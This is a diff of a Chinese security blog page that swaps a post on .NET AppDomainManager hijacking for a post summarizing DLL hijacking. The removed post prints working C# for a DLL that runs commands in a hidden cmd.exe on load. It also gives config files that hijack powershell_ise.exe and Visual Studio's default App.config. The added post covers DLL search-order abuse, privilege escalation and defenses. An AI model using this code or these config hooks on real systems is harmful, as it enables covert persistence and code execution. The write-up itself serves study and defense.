@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>.NET程序劫持 | 九世的博客</title>
-  <meta name="keywords" content=" 后门 ">
-  <meta name="description" content=".NET程序劫持 | 九世的博客">
+  <title>DLL劫持技术总结 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="DLL劫持技术总结 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1387,9 +1387,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-NET程序劫持" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-DLL劫持技术总结" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">.NET程序劫持</h1>
+        <h1 class="article-title">DLL劫持技术总结</h1>
     
     <div class="article-meta">
         
@@ -1398,14 +1398,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">后门</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-01-13 21:47:56">2020-01-13 21:07</time>
+        创建时间:<time class="date" title="更新时间: 2020-04-29 13:00:03">2020-04-29 12:43</time>
         
     </div>
     <div class="article-meta">
@@ -1427,7 +1427,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01实验过程"><span class="toc-text">0x01实验过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL的加载方式"><span class="toc-text">DLL的加载方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#示例"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么可以成功劫持？"><span class="toc-text">为什么可以成功劫持？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意事项"><span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防范DLL劫持"><span class="toc-text">防范DLL劫持</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1442,124 +1442,45 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>翻了翻收集的资源，打算学习一波。翻到三好学生的.NET劫持操作，复现一波<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578931405684&amp;di=878960c7f869a877008253f25bad9396&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201608%2F28%2F20160828175529_vVwaM.png" alt=""></p>
-<h2 id="0x01实验过程"><a href="#0x01实验过程" class="headerlink" title="0x01实验过程"></a>0x01实验过程</h2><p>创建一个简单的C#程序</p>
-<pre><code class="C#">using System;
-
-public class Program
-{
-    public static void Main()
-    {
-        Console.WriteLine(&quot;Inside the App&quot;);
-    }
-}
-</code></pre>
-<p>输出如下<br><img src="https://s2.ax1x.com/2020/01/13/lHhc0x.png" alt=""></p>
-<p>创建一个名为hijack.dll的dll</p>
-<pre><code class="C#">using System;
-using System.Text;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Reflection;
-using System.Runtime.Hosting;
-using System.Dynamic;
-
-namespace hijack
-{
-    public class cmd {
-        private static string CmdPath = @&quot;C:\Windows\System32\cmd.exe&quot;;
-        /// &lt;summary&gt;
-        /// 执行cmd命令 返回cmd窗口显示的信息
-        /// 多命令请使用批处理命令连接符：
-        /// &lt;![CDATA[
-        /// &amp;:同时执行两个命令
-        /// |:将上一个命令的输出,作为下一个命令的输入
-        /// &amp;&amp;：当&amp;&amp;前的命令成功时,才执行&amp;&amp;后的命令
-        /// ||：当||前的命令失败时,才执行||后的命令]]&gt;
-        /// &lt;/summary&gt;
-        /// &lt;param name=&quot;cmd&quot;&gt;执行的命令&lt;/param&gt;
-        public string RunCmd(string cmd)
-        {
-            cmd = cmd.Trim().TrimEnd(&#39;&amp;&#39;) + &quot;&amp;exit&quot;;//说明：不管命令是否成功均执行exit命令，否则当调用ReadToEnd()方法时，会处于假死状态
-            using (Process p = new Process())
-            {
-                p.StartInfo.FileName = CmdPath;
-                p.StartInfo.UseShellExecute = false;        //是否使用操作系统shell启动
-                p.StartInfo.RedirectStandardInput = true;   //接受来自调用程序的输入信息
-                p.StartInfo.RedirectStandardOutput = true;  //由调用程序获取输出信息
-                p.StartInfo.RedirectStandardError = true;   //重定向标准错误输出
-                p.StartInfo.CreateNoWindow = true;          //不显示程序窗口
-                p.Start();//启动程序
-
-                //向cmd窗口写入命令
-                p.StandardInput.WriteLine(cmd);
-                p.StandardInput.AutoFlush = true;
-
-                //获取cmd窗口的输出信息
-                string output = p.StandardOutput.ReadToEnd();
-                p.WaitForExit();//等待程序执行完退出进程
-                p.Close();
-
-                return output;
-            }
-        }
-    }
-    public class InjectedDomainManager : AppDomainManager
-    {
-        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
-        {
-            base.InitializeNewDomain(appDomainInfo);
-            cmd f = new cmd();
-            f.RunCmd(&quot;calc.exe&quot;);
-        }
-    }
-}
-</code></pre>
-<p>修改yuan.exe.config为如下</p>
-<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
-&lt;configuration&gt;
-    &lt;startup&gt; 
-        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
-    &lt;/startup&gt;
-     &lt;runtime&gt;
-      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
-      &lt;appDomainManagerAssembly
-         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
-    &lt;/runtime&gt;
-&lt;/configuration&gt;
-</code></pre>
-<p>之后hijack.dll运行在yuan.exe前面<br><img src="https://s2.ax1x.com/2020/01/13/lH4Z34.gif" alt=""></p>
-<p><strong>尝试劫持C:\Windows\system32\WindowsPowerShell\v1.0\powershell_ise.exe</strong><br>创建powershell_ise.exe.config</p>
-<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
-&lt;configuration&gt;
-    &lt;startup&gt; 
-        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
-    &lt;/startup&gt;
-     &lt;runtime&gt;
-      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
-      &lt;appDomainManagerAssembly
-         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
-    &lt;/runtime&gt;
-&lt;/configuration&gt;
-</code></pre>
-<p><img src="https://s2.ax1x.com/2020/01/13/lH5IeI.gif" alt=""></p>
-<p>还有一个操作就是修改Vs创建C#工程时的默认App.config</p>
-<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
-&lt;configuration&gt;
-    &lt;startup&gt; 
-        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
-    &lt;/startup&gt;
-     &lt;runtime&gt;
-      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
-      &lt;appDomainManagerAssembly
-         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
-    &lt;/runtime&gt;
-&lt;/configuration&gt;
-</code></pre>
-<p>编译的时候exe的config也会跟着改变<br><img src="https://s2.ax1x.com/2020/01/13/lHIB9S.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2020/01/13/lHoZ8S.gif" alt=""></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">Use AppDomainManager to maintain persistence – 3gstudent – Good in study, attitude and health</a></p>
+        <p>原本三天前想写了，因为懒。鸽了好久…</p>
+<blockquote>
+<p>路鸣泽的脸被愤怒所占满，他的黄金瞳照亮了这片黑暗，他狂笑着，他咆哮着，他是疯子，他是君主，他是恶魔，他是被世界遗弃了的神！</p>
+</blockquote>
+<h2 id="DLL的加载方式"><a href="#DLL的加载方式" class="headerlink" title="DLL的加载方式"></a>DLL的加载方式</h2><p>dll的加载方式有：静态加载、动态加载和延迟加载。<br>主要发生在动态加载和延迟加载</p>
+<p>dll劫持是一种技术，而不是漏洞。DLL劫持之前先要了解dll的加载顺序<br><img src="https://s1.ax1x.com/2020/04/29/JTEhyF.png" alt="DLL搜索过程"></p>
+<ol>
+<li>程序所在路径</li>
+<li>C:\Windows\System32</li>
+<li>C:\Windows\System</li>
+<li>C:\Windows</li>
+<li>程序所在路径</li>
+<li>环境变量里的路径寻找</li>
+</ol>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTEzeH.png" alt="环境变量"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>一个简单的DLL加载<br><img src="https://s1.ax1x.com/2020/04/29/JTVCFI.png" alt="正常加载"></p>
+<p>缺少DLL的整个DLL寻找过程（使用Procmon观察）<br><img src="https://s1.ax1x.com/2020/04/29/JTVAl8.png" alt=""></p>
+<p>此时可以生成一个恶意的DLL放到其中的一个路径。就可以进行恶意调用<br><img src="https://s1.ax1x.com/2020/04/29/JTVemQ.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTVQf0.gif" alt="效果"></p>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTV3lT.png" alt=""></p>
+<h2 id="为什么可以成功劫持？"><a href="#为什么可以成功劫持？" class="headerlink" title="为什么可以成功劫持？"></a>为什么可以成功劫持？</h2><p>msf生成的dll使用了DllEntryPoint函数<br><img src="https://s1.ax1x.com/2020/04/29/JTVGXF.png" alt=""><br>根据API搜索，得出结果</p>
+<blockquote>
+<p>DllEntryPoint函数是进入动态链接库（DLL）的可选方法。 如果使用该函数，则在初始化和终止进程和线程时，或者在调用LoadLibrary和FreeLibrary函数时，系统会调用该函数。 DllEntryPoint是库定义的函数名称的占位符。 实际名称必须在构建时指定。<br><img src="https://s1.ax1x.com/2020/04/29/JTV7ng.png" alt=""></p>
+</blockquote>
+<p>所以使用LoadLibraryA等函数进程DLL调用的时候，通过DllEntryPoint函数重新定义要执行的函数，从而实现执行恶意代码。当不使用LoadLibraryA进行DLL加载的时候（DllEntryPoint函数重新定义要执行的函数）这种方法是无效的。没有办法通过这种方法劫持，只能通过使用IDA分析DLL调用的外部函数（例如静态加载）。或者程序检查DLL的导出函数，是否有加载的函数名，如果没有。则不加载DLL，并效验DLL的md5是否一致</p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>DLL劫持的时候要注意以下几点（不可取）</p>
+<ol>
+<li>需要重新启动</li>
+<li>文件夹权限拒绝</li>
+</ol>
+<p>以上两点是不可取的，比如将DLL放入C:\Windows\System32是不可取的。压根没权限，实战中毫无作用</p>
+<p>而DLL可以造成提权的原因是：加载DLL使用SYSTEM权限，当DLL可成功劫持的时候即可造成权限提升<br>例如文章作者所述：<br>当一个拥有LocalSystem权限进行启动的服务，执行的进程的DLL可控。如下图所示<br><img src="https://s1.ax1x.com/2020/04/29/JTZV9x.png" alt=""></p>
+<h2 id="防范DLL劫持"><a href="#防范DLL劫持" class="headerlink" title="防范DLL劫持"></a>防范DLL劫持</h2><p>如何防止DLL劫持？<br>使用LoadLibraryEx函数代替LoadLibraryA<br>程序检查DLL的导出函数，是否有加载的函数名，如果没有。则不加载DLL，并效验DLL的md5是否一致</p>
+<p>在LoadLibraryEx里的dwFlags参数使用以下两个方式可以阻止DLL搜索的过程：<br>LOAD_LIBRARY_SEARCH_APPLICATION_DIR<br>LOAD_LIBRARY_SEARCH_SYSTEM32</p>
+<p>LOAD_LIBRARY_SEARCH_APPLICATION_DIR只允许在程序目录进行DLL搜索（通过将程序所在目录的文件夹权限拉高防止劫持）<br><img src="https://s1.ax1x.com/2020/04/29/JTZMHH.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTZlEd.png" alt=""></p>
+<p>LOAD_LIBRARY_SEARCH_SYSTEM32只允许在C:\Windows\System32进行DLL搜索<br><img src="https://s1.ax1x.com/2020/04/29/JTZGCt.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTZtv8.png" alt=""></p>
+<p>参考链接：<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa</a> -<br>LoadLibraryEx API<br><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://itm4n.github.io/windows-dll-hijacking-clarified/?tdsourcetag=s_pctim_aiomsg</a> - Windows DLL Hijacking (Hopefully) Clarified<br><a href="https://zhuanlan.zhihu.com/p/57279354" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57279354</a> - Windows下Dll的加载方式及错误处理</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1569,12 +1490,12 @@ namespace hijack
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>.NET程序劫持</p>
+    <p><span class="copy-title">文章标题:</span>DLL劫持技术总结</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-13, 21:07:33</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-13, 21:47:56</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/576bc259.html" title=".NET程序劫持">http://422926799.github.io/posts/576bc259.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-29, 12:43:43</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-29, 13:00:03</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/fd82243.html" title="DLL劫持技术总结">http://422926799.github.io/posts/fd82243.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
